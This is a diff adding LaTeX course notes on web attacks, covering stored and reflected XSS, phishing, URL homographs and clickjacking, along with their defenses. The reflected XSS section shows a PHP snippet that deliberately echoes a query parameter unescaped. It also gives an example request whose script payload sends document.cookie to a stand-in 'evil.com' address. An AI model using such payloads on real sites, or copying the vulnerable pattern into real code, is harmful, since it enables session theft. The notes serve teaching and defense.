@@ -1,0 +1,102 @@
+\section{Cross-Site Scripting}
+\subsection{Cross-Site Scripting (XSS)}
+Previously, we discussed that SOP can prohibit JavaScript from cross-origin access, i.e., attackers cannot trick the browser into allowing their script to access data. 
+
+However, Cross-Site Scripting (XSS) attacks are used to subvert the SOP. An attacker can trick a website into sending their malicious script to a browser. The browser is not able to determine where the script comes from, and the malicious script can operate in the origin of the website, thus having full access to its data. 
+
+There are two classes of XSS attacks: Stored XSS attacks and Reflected XSS attacks. 
+
+\subsection{Stored XSS attacks}
+The injected code is actually stored on a website's server, such as in a database, visitor log, etc. The victim server then returns the permanently injected code with its other contents to a browser. 
+
+XSS can be performed in two steps:
+
+1. the attacker first stores the JavaScript code on the target server as part of a message  
+
+2. the victim visits a page containing the injected code  
+
+So consider the overall workflow like this: the attacker injects a malicious script into the server, where a normal user gets a page with the malicious script and receives it. Then the script is executed in the context of the website, attack actions are performed, and sensitive information is leaked. 
+
+Any web application that stores user-supplied input without sanitization is vulnerable to this attack, e.g., blogs, comments, bulletin boards. 
+
+\subsection{Reflected XSS Attacks}
+The injected code is reflected off the victim server, such as in an error message, a search result, or any other response that includes or echoes part of the input that can be controlled by the attacker.
+
+The attacker first embeds the malicious script in the URL as a parameter in the query string. They then lure the user to visit their page, where the victim clicks a link to a trusted site. The server may echo back the script or the complete URL to the user, causing the malicious script to run in the context of the victim server.
+
+For example, in the following code, user input is echoed back in the HTML response:
+
+\begin{verbatim}
+<?php
+// search.php
+echo "Your search results of the term " . $_GET["term"] . " are:";
+foreach ($results as $row) {
+  // ...
+}
+?>
+\end{verbatim}
+
+A request like \texttt{GET /search.php?term=<script>Send(document.cookie,`admin@evil.com');</script>} can be used to send cookies.
+
+The trusted site then returns a page containing the injected JavaScript code, which is controlled by the attacker. This code executes in the context of the trusted website. The malicious JavaScript can access session tokens and reuse them to log into the website as the victim user, access all user information on the trusted site, or create a fake login form to steal user credentials.
+
+\subsection{Defense}
+To prevent XSS attacks, every piece of data that is returned to the user and can be influenced by input must be sanitized. This includes GET or POST parameters, cookies, request headers, database query results, file contents, etc.
+
+Many programming languages provide routines to prevent the introduction of code, but sanitization must be performed differently depending on where the data is used.
+
+In addition, special characters must be replaced with character entities. Some characters in HTML are reserved and must be encoded, since they are used by the browser parser to construct elements. Therefore, user input should be escaped before being processed by the parser. For example, use \texttt{\&lt;} for <, \texttt{\&gt;} for >, and \texttt{\&amp;} for \&.
+
+Allowing a server to specify what is allowed or not during the rendering of a webpage, e.g., prohibiting inline scripting by default, can help to mitigate XSS. A policy is returned by specifying the Content-Security-Policy HTTP header, or it can be defined in the \texttt{<meta>} tag. A policy can also define a whitelist of sources from which content can be fetched and executed, i.e., JavaScript, stylesheets, images, etc. The enforcement requires support from the browser.
+
+\section{UI-based Attacks}
+\subsection{Phishing Attack}
+Attackers can create fake websites that look similar to a legitimate website, then trick a victim user into visiting the fake website. The user then visits the site and inputs credentials, where the attacker receives the sensitive data and then redirects the victim user to the real website. 
+
+To defend against such phishing attacks, search engines can try to detect and remove phishing websites from the search results. However, attackers can still use other channels to lure users. 
+
+Attackers can also manipulate URLs. For example, in URL obfuscation or typos, attackers can choose similar URLs, like \texttt{www.gooogle.com}. In internationalized domain name homograph attacks, as there are many different characters that look alike, this can be utilized by the attacker to launch attacks. Therefore, users should check the URL. Also, browsers can provide some assistance in validating the URL, e.g., the padlock icon. 
+
+\subsection{Clickjacking}
+Clickjacking is also called UI redressing. A user can be lured into clicking an element that is not associated with the main frame that the user is browsing. In this way, the user's mouse click is used in a way that is not intended by the user. 
+
+It is usually performed by using overlapping transparent iframes with the following techniques:
+
+- stacking order: \texttt{z-index}  
+
+- transparency: \texttt{opacity}  
+
+- transparency in IE filter: \texttt{alpha(opacity=<value>)}  
+
+The attacker site then frames a target site. Clickjacking can also be used to bypass the SOP. 
+
+Clickjacking happens when there are multiple mutually distrusting applications sharing the same display. An attack application compromises the context integrity of another application's UI, including:
+
+- Visual Integrity  
+
+The target and pointer are visible. For the target, this can be compromised by hiding content and using partial overlays. For the pointer, cursor feedback can be manipulated. 
+
+- Temporal Integrity  
+
+\(\text{Target}_{\text{clicked}} = \text{Target}_{\text{checked}},\ \text{Pointer}_{\text{clicked}} = \text{Pointer}_{\text{checked}}\)
+
+This can be compromised using bait-and-switch, i.e., after checking, the use happens after the data is changed. 
+
+\subsection{Defense}
+To defend against clickjacking, we can utilize the following:
+
+- user confirmation  
+
+Show a confirmation dialog when some sensitive action is about to be made; however, this degrades user experience.  
+
+- UI randomization  
+
+Display the sensitive UI at random locations; however, this is unreliable.  
+
+- framebusting  
+
+Prevent other sites from embedding the frame, and check if the top frame is the current frame. If not, change the top frame location to the current one. However, this can be defeated.  
+
+- X-Frame-Options  
+
+This is used to indicate whether or not a browser should be allowed to render a page in a frame.  
